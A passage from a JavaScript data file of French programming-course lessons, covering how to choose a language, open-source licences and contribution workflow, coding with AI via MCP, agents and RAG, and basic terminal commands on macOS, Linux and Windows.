| ✨ AA/AAA | **Unreal Engine** | C++ / Blueprints | Graphismes AAA, très complexe |
| ✅ Web / casual | **Godot** | GDScript (Python-like) | Gratuit, open source, léger |

> **Verdict :** Débutant ou indie → **Unity (C#)**. C# est aussi utilisé en entreprise, donc l'investissement n'est pas perdu.

---

## Script / Automatisation / DevOps

**Contexte :** automatiser des tâches, CI/CD, infrastructure as code.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Universel | **Python** | Lisible, bibliothèques partout, fonctionne sur tout |
| ✅ Shell Unix | **Bash** | Natif Linux/macOS, parfait pour scripts simples |
| ✅ Windows | **PowerShell** | Natif Windows, intégré à Azure DevOps |
| ✅ Infra as code | **HCL (Terraform)** | Standard pour Terraform |

---

## Résumé : la matrice de décision

\`\`\`
Mon besoin         Choix raisonnable       Choix idéal (si budget/temps)
─────────────────────────────────────────────────────────────────────
App web startup    Node.js + TypeScript    Go + TypeScript
App entreprise     Java / C#               Kotlin / Go
Mobile (les deux)  Flutter ou React Native Swift + Kotlin natif
IA / Data          Python                  Python (même choix !)
API performante    Node.js ou FastAPI      Go
Système embarqué   C / C++                 Rust
Jeu vidéo indie    Unity (C#)              Unreal (C++) si AAA
Automatisation     Python / Bash           Python
\`\`\`

---

## Les 3 questions à te poser avant de choisir

**1. Combien de développeurs connaissent ce langage dans ma région / à distance ?**
→ Si tu peux pas trouver 10 CVs en 1 mois, c'est un signal d'alarme.

**2. Est-ce que la performance de ce langage va vraiment changer quelque chose pour mon projet à court terme ?**
→ Si tu as moins de 100 000 utilisateurs, la réponse est presque toujours non.

**3. Est-ce que l'écosystème (frameworks, bibliothèques, outils) répond à mes besoins sans tout coder from scratch ?**
→ Un bon écosystème vaut souvent plus que les performances brutes du langage.`
      }
    ]
  },

  // ─── OPEN SOURCE ──────────────────────────────────────────────────────────
  {
    id: "open-source",
    category: "Fondamentaux",
    emoji: "🔓",
    title: "Open Source & Licences",
    description: "Comprendre l'open source, les licences et contribuer à des projets Git",
    level: "Débutant",
    color: "#10B981",
    lessons: [
      {
        id: "open-source-intro",
        title: "Qu'est-ce que l'open source ?",
        duration: "10 min",
        content: `# Qu'est-ce que l'open source ?

Un logiciel **open source** est un logiciel dont le **code source est public**, librement consultable, modifiable et redistribuable selon les conditions d'une licence.

## L'idée derrière l'open source

À l'origine, dans les années 70-80, tous les logiciels s'échangeaient librement avec leur code. C'est la commercialisation des années 80 qui a créé le modèle du logiciel propriétaire (code source secret, pas de modification possible).

En réaction, **Richard Stallman** lance en 1983 le projet GNU et en 1985 la **Free Software Foundation** avec 4 libertés fondamentales :

| Liberté | Droit |
|---------|-------|
| 0 | Utiliser le programme pour n'importe quel usage |
| 1 | Étudier le fonctionnement du programme (accès au code) |
| 2 | Redistribuer des copies |
| 3 | Modifier le programme et distribuer ses versions modifiées |

En 1998, le terme **"Open Source"** est créé pour rendre l'idée plus accessible aux entreprises.

## Open Source ≠ Gratuit

C'est la confusion la plus fréquente.

\\`\\`\\`
Open Source = le code est visible et modifiable
Gratuit     = aucun coût d'utilisation

→ Un logiciel peut être open source ET payant (Red Hat Enterprise Linux)
→ Un logiciel peut être gratuit ET propriétaire (Skype, Adobe Acrobat Reader)
\\`\\`\\`

## Pourquoi les entreprises font de l'open source ?

- **Réputation et recrutement** : les devs font confiance aux entreprises qui contribuent
- **Qualité du code** : des milliers de yeux repèrent les bugs
- **Adoption** : si c'est gratuit, plus de monde l'adopte → standard de facto
- **Contributions externes** : des devs du monde entier améliorent le produit gratuitement
- **Modèle freemium** : code open source + services payants (support, cloud, enterprise)

## Les grands projets open source qui font tourner le monde

| Projet | Catégorie | Qui maintient |
|--------|-----------|--------------|
| Linux | Système d'exploitation | Linus Torvalds + communauté |
| Git | Contrôle de version | Linus Torvalds + communauté |
| Firefox | Navigateur | Mozilla Foundation |
| PostgreSQL | Base de données | PostgreSQL Global Dev Group |
| React | Framework UI | Meta |
| VS Code | Éditeur de code | Microsoft |
| Python | Langage | Python Software Foundation |
| Kubernetes | Orchestration conteneurs | CNCF / Google |
| Android | OS mobile | Google + communauté |
| WordPress | CMS | Automattic + communauté |

## Open Source vs Source Available vs Propriétaire

| Modèle | Code visible | Modifiable | Redistribuable | Exemple |
|--------|-------------|-----------|----------------|---------|
| Open Source | ✅ | ✅ | ✅ (selon licence) | Linux, React |
| Source Available | ✅ | ❌ ou limité | ❌ | Elasticsearch (SSPL) |
| Freeware | ❌ | ❌ | ❌ | Skype |
| Propriétaire | ❌ | ❌ | ❌ | Windows, macOS |`
      },
      {
        id: "open-source-licences",
        title: "Les licences open source expliquées",
        duration: "16 min",
        content: `# Les licences open source expliquées

La licence est le **contrat légal** qui définit ce que tu as le droit de faire avec le code. Sans licence, le code est automatiquement soumis au droit d'auteur exclusif : personne ne peut légalement l'utiliser.

## La grande division : permissive vs copyleft

\\`\\`\\`
PERMISSIVE                          COPYLEFT
"Fais ce que tu veux,               "Tu peux utiliser, mais si tu
 même fermer le code"                distribues, le code reste ouvert"

MIT, Apache, BSD                    GPL, AGPL, LGPL
\\`\\`\\`

## MIT License — la plus utilisée

\\`\\`\\`
✅ Utiliser commercialement
✅ Modifier et distribuer
✅ Intégrer dans un projet propriétaire
⚠️  Obligation : conserver la notice de copyright
❌ Aucune garantie de l'auteur
\\`\\`\\`

**Utilisée par :** React, Vue.js, Node.js, jQuery, Bootstrap, Rails

**Quand choisir MIT :** tu veux une adoption maximale, même commerciale.

## Apache License 2.0 — pour les entreprises

\\`\\`\\`
✅ Tout ce que MIT autorise
✅ Protection contre les poursuites pour brevets
⚠️  Obligation : noter les modifications apportées
⚠️  Inclure la licence et les notices
\\`\\`\\`

**Utilisée par :** Android, Kubernetes, TensorFlow, Kafka

**Quand choisir Apache 2.0 :** domaines avec risques de brevets (tech, IA). Recommandée pour les projets d'entreprise.

## GPL v2 / v3 — le copyleft fort

La licence "virale". Si tu distribues un programme basé sur du code GPL, **tout ton code doit aussi être GPL**.

\\`\\`\\`
✅ Utiliser et modifier
✅ Usage interne sans obligation
❌ Si tu distribues → code source obligatoire
❌ Impossible d'intégrer dans du code propriétaire distribué
\\`\\`\\`

**Utilisée par :** Linux kernel (v2), WordPress, Git, VLC, GIMP

**La faille SaaS :** utiliser du GPL sur un serveur (sans distribution) ne t'oblige PAS à ouvrir ton code.

## AGPL v3 — ferme la faille SaaS

\\`\\`\\`
Même chose que GPL v3, PLUS :
→ Fournir le service via le réseau (SaaS, API) = distribution
→ Tu dois quand même publier le code source
\\`\\`\\`

**Utilisée par :** Grafana, Nextcloud, Gitea, MongoDB (anciennement)

**Attention :** beaucoup d'équipes juridiques d'entreprise interdisent l'usage de code AGPL.

## LGPL — copyleft doux pour les bibliothèques

\\`\\`\\`
✅ Lier dynamiquement une lib LGPL dans ton code propriétaire
❌ Modifier et redistribuer la lib → doit rester LGPL
\\`\\`\\`

**Utilisée par :** Qt (partiel), FFmpeg, GNU C Library

## Tableau comparatif

| Licence | Commercial | Code fermé distribué | Faille SaaS | Brevets |
|---------|-----------|---------------------|-------------|---------|
| MIT | ✅ | ✅ | ✅ | ❌ |
| Apache 2.0 | ✅ | ✅ | ✅ | ✅ |
| LGPL | ✅ partiel | ⚠️ | ✅ | ❌ |
| GPL v2/v3 | ✅ interne | ❌ | ✅ | ✅ v3 |
| AGPL v3 | ❌ SaaS | ❌ | ❌ | ✅ |

## Comment choisir sa licence

\\`\\`\\`
Adoption maximale ?              → MIT
Environnement brevets/entreprise → Apache 2.0
Améliorations ouvertes (distribué) → GPL v3
Bloquer les SaaS non contributeurs → AGPL v3
Bibliothèque usage commercial libre → LGPL
\\`\\`\\`

## Le cas "sans licence"

Un code sans licence n'est **pas libre d'utilisation**. Le droit d'auteur s'applique automatiquement. Pour tout céder → utilise **CC0** (domaine public).`
      },
      {
        id: "open-source-contribuer",
        title: "Contribuer à un projet open source",
        duration: "14 min",
        content: `# Contribuer à un projet open source

Contribuer à l'open source est une des meilleures façons de progresser, de se faire connaître et d'aider la communauté.

## Les types de contributions

| Type | Exemples |
|------|---------|
| Code | Corriger un bug, ajouter une fonctionnalité |
| Documentation | Améliorer le README, traduire |
| Tests | Écrire des tests manquants, rapporter des bugs |
| Review | Relire les Pull Requests des autres |
| Support | Répondre aux issues, aider sur les forums |

## Le workflow sur GitHub

### 1. Trouver une issue

Sur GitHub, cherche les labels :
- \\`good first issue\\` → pour débutants
- \\`help wanted\\` → mainteneurs cherchent de l'aide
- \\`documentation\\` → améliorations de doc

Lis **CONTRIBUTING.md** avant tout.

### 2. Forker et cloner

\\`\\`\\`bash
# Fork sur GitHub (bouton "Fork")

# Cloner ton fork
git clone https://github.com/TON-PSEUDO/nom-du-projet.git
cd nom-du-projet

# Ajouter le repo original comme upstream
git remote add upstream https://github.com/AUTEUR/nom-du-projet.git
\\`\\`\\`

### 3. Créer une branche dédiée

\\`\\`\\`bash
git fetch upstream
git checkout upstream/main -b fix/description-du-bug
\\`\\`\\`

Convention de nommage :
- \\`fix/nom-du-bug\\`
- \\`feat/nom-feature\\`
- \\`docs/section-concernee\\`

### 4. Committer avec Conventional Commits

\\`\\`\\`bash
git commit -m "fix: corriger le crash au démarrage sans config"

# Préfixes standards :
# feat:     nouvelle fonctionnalité
# fix:      correction de bug
# docs:     documentation uniquement
# refactor: restructuration du code
# test:     ajout de tests
# chore:    maintenance
\\`\\`\\`

### 5. Ouvrir une Pull Request

\\`\\`\\`bash
git push origin fix/description-du-bug
\\`\\`\\`

Une bonne PR :
- Titre clair décrivant le changement
- Explication du **pourquoi** dans la description
- Référence l'issue : \\`Closes #123\\`
- Minimum de changements (pas de reformatage parasite)

### 6. Après le merge

\\`\\`\\`bash
git fetch upstream
git checkout main
git merge upstream/main
git push origin main
git branch -d fix/description-du-bug
\\`\\`\\`

## Les fichiers clés d'un projet open source

| Fichier | Rôle |
|---------|------|
| \\`README.md\\` | Présentation, installation, usage |
| \\`CONTRIBUTING.md\\` | Comment contribuer, règles |
| \\`CODE_OF_CONDUCT.md\\` | Règles de comportement |
| \\`LICENSE\\` | La licence |
| \\`CHANGELOG.md\\` | Historique des versions |
| \\`SECURITY.md\\` | Signaler une faille |

## Étiquette dans l'open source

- **Sois patient** : les mainteneurs sont souvent bénévoles
- **Cherche avant de demander** : lis les issues existantes
- **Sois précis dans les bug reports** : OS, version, étapes de reproduction
- **Une PR = un problème** : ne mélange pas plusieurs corrections
- **Respecte le style du projet**`
      },
      {
        id: "open-source-creer",
        title: "Créer et gérer son projet open source",
        duration: "12 min",
        content: `# Créer et gérer son projet open source

Publier un projet open source va au-delà de "mettre le code sur GitHub".

## Structure minimale recommandée

\\`\\`\\`
mon-projet/
├── src/                    # Code source
├── tests/                  # Tests
├── README.md               # OBLIGATOIRE
├── LICENSE                 # OBLIGATOIRE
├── CONTRIBUTING.md         # Recommandé
└── .gitignore
\\`\\`\\`

## Le versionnage sémantique (SemVer)

Convention universelle : **MAJEURE.MINEURE.CORRECTIF**

\\`\\`\\`
v2.4.1
│ │ └── CORRECTIF (patch) : bug fix, rétrocompatible
│ └──── MINEURE (minor)   : nouvelle feature, rétrocompatible
└────── MAJEURE (major)   : breaking change

Exemples :
1.0.0 → 1.0.1  bug fix
1.0.1 → 1.1.0  nouvelle feature
1.1.0 → 2.0.0  API incompatible
\\`\\`\\`

En \\`0.x.x\\` : tout peut changer. À \\`1.0.0\\` tu t'engages à respecter SemVer.

## Labels GitHub utiles

\\`\\`\\`
good first issue    → pour les débutants
help wanted         → tu cherches des contributeurs
bug                 → comportement anormal confirmé
enhancement         → nouvelle fonctionnalité
duplicate           → issue déjà signalée
wontfix             → hors périmètre
\\`\\`\\`

## CI avec GitHub Actions

\\`\\`\\`yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm install
      - run: npm test
\\`\\`\\`

## Monétiser son open source

| Modèle | Comment | Exemples |
|--------|---------|---------|
| Open Core | Version libre + fonctionnalités premium | GitLab |
| SaaS | Hébergement payant | GitHub (basé sur Git) |
| Support | Vendre du support professionnel | Red Hat |
| Donations | GitHub Sponsors, Open Collective | Curl, VLC |`
      }
    ]
  },

  // ─── CODER AVEC L'IA ──────────────────────────────────────────────────────
  {
    id: "coder-avec-ia",
    category: "IA & LLM",
    emoji: "🤖",
    title: "Coder avec l'IA",
    description: "MCP, agents, sous-agents, RAG : maîtriser les outils IA pour développer",
    level: "Intermédiaire",
    color: "#8B5CF6",
    lessons: [
      {
        id: "ia-coder-intro",
        title: "L'IA comme partenaire de développement",
        duration: "10 min",
        content: `# L'IA comme partenaire de développement

Les LLMs (GPT-4, Claude, Gemini…) ont transformé la façon de coder. Bien les utiliser demande de comprendre leurs forces, limites et les bons patterns.

## Ce que l'IA fait très bien

| Tâche | Efficacité |
|-------|-----------|
| Générer du code boilerplate | ★★★★★ |
| Expliquer du code existant | ★★★★★ |
| Convertir d'un langage à l'autre | ★★★★★ |
| Écrire des tests unitaires | ★★★★☆ |
| Déboguer avec un message d'erreur | ★★★★☆ |
| Refactorer du code | ★★★★☆ |
| Concevoir une architecture complexe | ★★★☆☆ |
| Code métier très spécifique | ★★☆☆☆ |

## Ce que l'IA fait mal

- **Code récent** : les modèles ont une date de coupure
- **Contexte long** : perd le fil sur de très gros fichiers
- **Logique métier** : ne connaît pas ton domaine
- **Sécurité** : peut générer du code vulnérable sans le signaler
- **Hallucinations** : inventer des fonctions ou libs qui n'existent pas

## Prompter efficacement pour le code

**Mauvais :**
\\`\\`\\`
Fais-moi une fonction Python
\\`\\`\\`

**Bon :**
\\`\\`\\`
Écris une fonction Python qui :
- Prend une liste de dicts avec clés "nom" et "score"
- Filtre les entrées avec score > 80
- Trie par score décroissant
- Retourne les 3 premiers
- Inclus un exemple et les cas limites (liste vide, ex aequo)
\\`\\`\\`

## La règle du contexte

Donne toujours à l'IA :
\\`\\`\\`
1. Contexte du projet    → "C'est une API FastAPI, Python 3.11"
2. Code existant         → colle les fichiers concernés
3. Message d'erreur exact → copie-colle l'erreur complète
4. Ce que tu as essayé   → évite les suggestions déjà testées
5. La contrainte clé     → "doit être compatible Python 3.9"
\\`\\`\\`

## Outils IA pour coder

| Outil | Type | Forces |
|-------|------|--------|
| GitHub Copilot | Complétion IDE | Inline, très réactif |
| Claude | Chat + agent | Long contexte, précis |
| Cursor | IDE complet IA | Contexte codebase entier |
| Claude Code | CLI agent | Terminal, fichiers, git |
| GPT-4o | Chat + agent | Polyvalent |`
      },
      {
        id: "ia-mcp",
        title: "Le protocole MCP : connecter l'IA à tes outils",
        duration: "14 min",
        content: `# Le protocole MCP : connecter l'IA à tes outils

**MCP** (Model Context Protocol) est un protocole open source créé par Anthropic qui permet à un LLM de se connecter à des outils et sources de données externes de façon standardisée.

## Le problème que MCP résout

\\`\\`\\`
Avant MCP :
Claude ─── intégration custom ──→ GitHub
Claude ─── intégration custom ──→ Notion
Claude ─── intégration custom ──→ PostgreSQL
(N outils × M LLMs = NxM intégrations à maintenir)

Avec MCP :
Claude ──→ protocole MCP ──→ serveur MCP GitHub
                          ──→ serveur MCP Notion
                          ──→ serveur MCP PostgreSQL
(N outils + M LLMs = N+M implémentations seulement)
\\`\\`\\`

## Architecture MCP

MCP fonctionne en client-serveur :

\\`\\`\\`
Application hôte (Claude Desktop, Claude Code...)
  │
  │  protocole MCP (JSON-RPC sur stdio/HTTP)
  │
  ├──→ Serveur MCP GitHub  ──→ API GitHub
  ├──→ Serveur MCP BDD     ──→ PostgreSQL
  └──→ Serveur MCP Fichiers ──→ Système de fichiers
\\`\\`\\`

## Ce qu'un serveur MCP expose

### Tools (Outils)
Des fonctions que le LLM peut appeler :

\\`\\`\\`json
{
  "name": "create_github_issue",
  "description": "Crée une issue GitHub",
  "inputSchema": {
    "type": "object",
    "properties": {
      "repo": { "type": "string" },
      "title": { "type": "string" },
      "body": { "type": "string" }
    }
  }
}
\\`\\`\\`

### Resources
Des données que le LLM peut lire (fichiers, pages, BDD…)

### Prompts
Des templates préconfigurés pour des tâches récurrentes

## Créer un serveur MCP simple (Python)

\\`\\`\\`python
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent
import asyncio

app = Server("mon-serveur-mcp")

@app.list_tools()
async def list_tools():
    return [
        Tool(
            name="get_weather",
            description="Récupère la météo d'une ville",
            inputSchema={
                "type": "object",
                "properties": {
                    "city": {"type": "string"}
                },
                "required": ["city"]
            }
        )
    ]

@app.call_tool()
async def call_tool(name: str, arguments: dict):
    if name == "get_weather":
        city = arguments["city"]
        # Appel API réel ici
        return [TextContent(type="text", text=f"Météo à {city} : 22°C")]

async def main():
    async with stdio_server() as (read, write):
        await app.run(read, write, app.create_initialization_options())

asyncio.run(main())
\\`\\`\\`

## Configurer MCP dans Claude Desktop

\\`\\`\\`json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "ton-token" }
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/toi/projets"]
    },
    "postgres": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-postgres", "postgresql://localhost/madb"]
    }
  }
}
\\`\\`\\`

## Serveurs MCP populaires

| Serveur | Capacités |
|---------|----------|
| \\`server-github\\` | Issues, PRs, repos, code |
| \\`server-filesystem\\` | Lire/écrire fichiers locaux |
| \\`server-postgres\\` | Requêtes SQL |
| \\`server-brave-search\\` | Recherche web |
| \\`server-slack\\` | Messages Slack |
| \\`mcp-server-fetch\\` | Récupérer des URLs |`
      },
      {
        id: "ia-agents",
        title: "Agents et sous-agents : l'IA qui agit",
        duration: "16 min",
        content: `# Agents et sous-agents : l'IA qui agit

Un **agent IA** est un LLM capable d'utiliser des **outils** pour accomplir des tâches de façon autonome, en décidant lui-même quelles actions enchaîner.

## LLM vs Agent

\\`\\`\\`
LLM seul :
  Tu → Question → LLM → Réponse texte

Agent :
  Tu → Objectif → Agent → [choisit un outil]
                        → Exécute l'outil
                        → Reçoit le résultat
                        → [décide de l'étape suivante]
                        → ... répète ...
                        → Résultat final
\\`\\`\\`

## Le pattern ReAct (Reason + Act)

\\`\\`\\`
Objectif : "Trouve le prix de l'action Apple et fais un graphique"

THOUGHT : Je dois chercher le prix AAPL
ACTION  : search_web("Apple stock price AAPL")
RESULT  : AAPL = 189.45$

THOUGHT : Je dois créer le graphique
ACTION  : run_code("import matplotlib... plt.bar(['AAPL'], [189.45])")
RESULT  : graphique.png créé

FINAL   : Prix Apple = 189.45$. Voici le graphique.
\\`\\`\\`

## Les sous-agents (subagents)

Un agent peut **déléguer des sous-tâches** à d'autres agents spécialisés :

\\`\\`\\`
Agent Orchestrateur : "Audit complet de mon app"
         │
         ├──→ Sous-agent Sécurité    → rapport vulnérabilités
         ├──→ Sous-agent Performance → rapport temps de réponse
         └──→ Sous-agent Qualité     → rapport code quality
                    │
         Orchestrateur synthétise → Rapport final
\\`\\`\\`

**Avantages :** tâches en parallèle, contexte spécialisé par agent, pas de saturation du contexte principal.

## Créer un agent avec l'API Claude

\\`\\`\\`python
import anthropic

client = anthropic.Anthropic()

tools = [{
    "name": "read_file",
    "description": "Lit le contenu d'un fichier",
    "input_schema": {
        "type": "object",
        "properties": {
            "path": {"type": "string"}
        },
        "required": ["path"]
    }
}]

def run_agent(objective: str):
    messages = [{"role": "user", "content": objective}]

    while True:
        response = client.messages.create(
            model="claude-opus-4-5",
            max_tokens=4096,
            tools=tools,
            messages=messages
        )

        if response.stop_reason == "end_turn":
            return response.content[0].text

        if response.stop_reason == "tool_use":
            tool_use = next(b for b in response.content if b.type == "tool_use")

            if tool_use.name == "read_file":
                with open(tool_use.input["path"]) as f:
                    result = f.read()

            messages.append({"role": "assistant", "content": response.content})
            messages.append({
                "role": "user",
                "content": [{
                    "type": "tool_result",
                    "tool_use_id": tool_use.id,
                    "content": result
                }]
            })
\\`\\`\\`

## Patterns d'architecture multi-agents

| Pattern | Schéma | Idéal pour |
|---------|--------|------------|
| Séquentiel | A → B → C | Pipelines étape par étape |
| Parallèle | Entrée → [A, B, C] → Agrégateur | Tâches indépendantes |
| Hiérarchique | Orchestrateur → sous-agents | Tâches complexes adaptatives |

## Garder le contrôle

\\`\\`\\`
✅ Confirmation humaine avant actions irréversibles
✅ Sandbox (pas d'accès direct à la prod)
✅ Logging de toutes les actions
✅ Timeout et budget de tokens max
✅ Principe du moindre privilège (outils minimaux nécessaires)
\\`\\`\\``
      },
      {
        id: "ia-rag",
        title: "Le RAG : donner de la mémoire à l'IA",
        duration: "14 min",
        content: `# Le RAG : donner de la mémoire à l'IA

**RAG** (Retrieval-Augmented Generation) permet à un LLM de répondre à des questions en s'appuyant sur **tes propres données** qu'il ne connaît pas de base.

## Le problème sans RAG

\\`\\`\\`
"Quelle est notre politique de remboursement ?"
→ LLM : "Je n'ai pas accès à vos documents internes..."

"Résume la réunion du 15 mars 2025"
→ LLM : "Je n'ai pas connaissance de cette réunion..."
\\`\\`\\`

## Comment fonctionne le RAG

\\`\\`\\`
PHASE 1 : INDEXATION (une fois)
Documents → Découper en chunks → Embeddings → Base vectorielle

PHASE 2 : REQUÊTE (à chaque question)
Question → Embedding → Recherche similarité → Top 3 chunks
        → Prompt : "Voici les extraits : [chunks]. Réponds à : [question]"
        → LLM génère la réponse
\\`\\`\\`

## Les embeddings

Un embedding est une représentation numérique d'un texte. Des textes sémantiquement proches ont des vecteurs proches.

\\`\\`\\`python
"le chien court"   → [0.23, -0.45, 0.12, ...]  # voisins
"le chiot galope"  → [0.21, -0.43, 0.14, ...]  # proches
"la voiture roule" → [-0.34, 0.67, -0.23, ...] # éloigné
\\`\\`\\`

## RAG avec ChromaDB (exemple complet)

\\`\\`\\`python
import chromadb
from chromadb.utils import embedding_functions
import anthropic

# Base vectorielle locale
chroma = chromadb.Client()
embed_fn = embedding_functions.SentenceTransformerEmbeddingFunction(
    model_name="all-MiniLM-L6-v2"  # modèle gratuit, local
)
collection = chroma.create_collection("mes_docs", embedding_function=embed_fn)

# Indexer des documents
documents = [
    "Notre politique de retour est de 30 jours sans justificatif.",
    "Le service client est disponible du lundi au vendredi 9h-18h.",
    "Les commandes supérieures à 50€ sont livrées gratuitement.",
]
collection.add(documents=documents, ids=["doc1", "doc2", "doc3"])

# Requête RAG
def rag_query(question: str) -> str:
    # 1. Retrouver les chunks pertinents
    results = collection.query(query_texts=[question], n_results=2)
    context = "\n\n".join(results["documents"][0])

    # 2. Générer la réponse avec Claude
    client = anthropic.Anthropic()
    response = client.messages.create(
        model="claude-opus-4-5",
        max_tokens=1024,
        messages=[{
            "role": "user",
            "content": f"""Extraits de documentation :

{context}

---
Question : {question}
Réponds uniquement à partir des extraits. Si absent, dis-le clairement."""
        }]
    )
    return response.content[0].text

print(rag_query("Comment retourner un produit ?"))
# → "Notre politique de retour est de 30 jours sans justificatif."
\\`\\`\\`

## Les bases de données vectorielles

| Outil | Type | Points forts |
|-------|------|-------------|
| ChromaDB | Local/Cloud | Simple, gratuit, Python natif |
| Pinecone | Cloud | Scalable, géré |
| Qdrant | Open source | Très rapide (Rust) |
| pgvector | Extension PostgreSQL | Dans ta BDD existante |
| FAISS | Bibliothèque Meta | Très rapide, local |

## Pièges classiques du RAG

\\`\\`\\`
Chunks trop grands   → contexte utile noyé dans le bruit
Chunks trop petits   → manque de contexte pour comprendre
Mauvais découpage    → couper une phrase au milieu perd le sens
Données périmées     → re-indexer régulièrement si les docs changent
Hallucination        → le LLM invente si les chunks n'ont pas la réponse
\\`\\`\\`

## RAG vs Fine-tuning

| | RAG | Fine-tuning |
|--|-----|------------|
| Données changeantes | ✅ Idéal | ❌ À refaire |
| Données confidentielles | ✅ Restent locales | ⚠️ Risque cloud |
| Style / ton spécifique | ❌ Limité | ✅ Idéal |
| Coût | Faible | Élevé |
| Rapidité de mise en place | Rapide | Long |

**Règle :** commence toujours par le RAG. Le fine-tuning est rarement nécessaire.`
      }
    ]
  },

  // ─── OUTILS ───────────────────────────────────────────────────────────────
  {
    id: "terminal",
    category: "Outils",
    emoji: "💻",
    title: "Terminal & Ligne de commande",
    description: "Maîtrise le terminal sur macOS et Windows",
    level: "Débutant",
    color: "#06B6D4",
    lessons: [
      {
        id: "terminal-introduction",
        title: "Qu'est-ce que le terminal ?",
        duration: "8 min",
        content: `# Qu'est-ce que le terminal ?

Le **terminal** (aussi appelé invite de commande, shell ou console) est une interface textuelle qui te permet de communiquer directement avec ton ordinateur en tapant des commandes.

## Pourquoi apprendre le terminal ?

- Automatiser des tâches répétitives
- Naviguer dans les fichiers plus rapidement qu'avec la souris
- Utiliser des outils de développement (Git, Node.js, Python…)
- Déployer des applications sur des serveurs
- Comprendre comment fonctionne vraiment ton système

## Le terminal selon ton OS

| Système | Terminal par défaut | Shell |
|---------|--------------------|----|
| macOS | Terminal.app / iTerm2 | zsh (depuis macOS Catalina) |
| Windows | Invite de commandes (cmd) | cmd.exe |
| Windows | PowerShell | powershell.exe |
| Windows 11 | Windows Terminal | PowerShell / cmd / WSL |

## Comment ouvrir le terminal

**macOS :**
- Spotlight : \`⌘ + Espace\`, tape "Terminal", Entrée
- Finder → Applications → Utilitaires → Terminal

**Windows :**
- \`Win + R\`, tape \`cmd\` ou \`powershell\`, Entrée
- Barre de recherche → "Terminal" ou "Invite de commandes"
- Clic droit sur le bureau → "Ouvrir dans le terminal" (Windows 11)

## Anatomie d'une commande

\`\`\`
$ commande  option  argument
$ ls        -la     /Users/moi
\`\`\`

- **\`$\`** : invite de commande (ne pas taper)
- **commande** : l'action à exécuter
- **option** (ou flag) : modifie le comportement (\`-l\`, \`--help\`)
- **argument** : sur quoi agit la commande (fichier, dossier…)`
      },
      {
        id: "terminal-navigation",
        title: "Naviguer dans les fichiers",
        duration: "12 min",
        content: `# Naviguer dans les fichiers

La compétence de base du terminal : se déplacer dans l'arborescence de fichiers.

## macOS / Linux

### Voir où tu es
\`\`\`bash
pwd
# /Users/alice/Documents
\`\`\`

### Lister les fichiers
\`\`\`bash
ls              # liste simple
ls -l           # liste détaillée (permissions, taille, date)
ls -la          # idem + fichiers cachés (commençant par .)
ls -lh          # tailles lisibles (KB, MB…)
\`\`\`

### Se déplacer
\`\`\`bash
cd Documents            # aller dans Documents
cd ..                   # remonter d'un niveau
cd ../..                # remonter de deux niveaux
cd ~                    # aller dans le dossier personnel
cd -                    # retourner au dossier précédent
cd /Users/alice/Desktop # chemin absolu
\`\`\`

### Créer des dossiers et fichiers
\`\`\`bash
mkdir mon-projet        # créer un dossier
mkdir -p a/b/c          # créer des dossiers imbriqués
touch fichier.txt       # créer un fichier vide
\`\`\`

---

## Windows (cmd)

### Voir où tu es
\`\`\`cmd
cd
# C:\\Users\\alice\\Documents
\`\`\`

### Lister les fichiers
\`\`\`cmd
dir             # liste détaillée
dir /a          # inclure les fichiers cachés
\`\`\`

### Se déplacer
\`\`\`cmd
cd Documents            :: aller dans Documents
cd ..                   :: remonter d'un niveau
cd /                    :: aller à la racine du disque
cd C:\\Users\\alice      :: chemin absolu
D:                      :: changer de disque (D:, E:…)
\`\`\`

### Créer des dossiers et fichiers
\`\`\`cmd
mkdir mon-projet        :: créer un dossier
mkdir a\\b\\c            :: créer des dossiers imbriqués
type nul > fichier.txt  :: créer un fichier vide
\`\`\`

## Windows (PowerShell)

PowerShell comprend les commandes Unix ET ses propres alias :

\`\`\`powershell
pwd             # ou Get-Location
ls              # ou Get-ChildItem
ls -Force       # inclure fichiers cachés
cd Documents    # ou Set-Location
mkdir dossier   # ou New-Item -ItemType Directory -Name "dossier"
New-Item fichier.txt   # créer un fichier
\`\`\`

## Tableau comparatif

| Action | macOS/Linux | Windows cmd | PowerShell |
|--------|-------------|-------------|------------|
| Où suis-je ? | \`pwd\` | \`cd\` | \`pwd\` |
| Lister | \`ls\` | \`dir\` | \`ls\` |
| Aller dans dossier | \`cd nom\` | \`cd nom\` | \`cd nom\` |
| Remonter | \`cd ..\` | \`cd ..\` | \`cd ..\` |
| Créer dossier | \`mkdir\` | \`mkdir\` | \`mkdir\` |`
      },
      {
        id: "terminal-fichiers",
        title: "Gérer les fichiers et dossiers",
        duration: "14 min",
        content: `# Gérer les fichiers et dossiers

Copier, déplacer, supprimer, lire des fichiers directement depuis le terminal.

## macOS / Linux

### Copier
\`\`\`bash
cp fichier.txt copie.txt            # copier un fichier
cp fichier.txt /autre/dossier/      # copier vers un dossier
cp -r mon-projet/ sauvegarde/       # copier un dossier (récursif)
\`\`\`

### Déplacer / Renommer
\`\`\`bash
mv ancien.txt nouveau.txt           # renommer
mv fichier.txt /autre/dossier/      # déplacer
mv dossier/ /nouveau/chemin/        # déplacer un dossier
\`\`\`

### Supprimer
\`\`\`bash
rm fichier.txt                      # supprimer un fichier
rm -r mon-dossier/                  # supprimer un dossier (récursif)
rm -rf node_modules/                # forcer la suppression (ATTENTION !)
\`\`\`

> **⚠️ Attention** : \`rm\` est définitif, pas de corbeille !

### Lire des fichiers
\`\`\`bash
cat fichier.txt                     # afficher tout le contenu
less fichier.txt                    # afficher page par page (q pour quitter)
head -n 10 fichier.txt              # afficher les 10 premières lignes
tail -n 10 fichier.txt              # afficher les 10 dernières lignes
tail -f logs.txt                    # suivre un fichier en temps réel
\`\`\`

### Rechercher
\`\`\`bash
find . -name "*.txt"                # trouver tous les .txt dans le dossier courant
find . -name "index.js"             # chercher un fichier par nom
grep "erreur" fichier.log           # chercher un texte dans un fichier
grep -r "TODO" ./src/               # chercher dans tous les fichiers d'un dossier
\`\`\`

---

## Windows (cmd)

### Copier
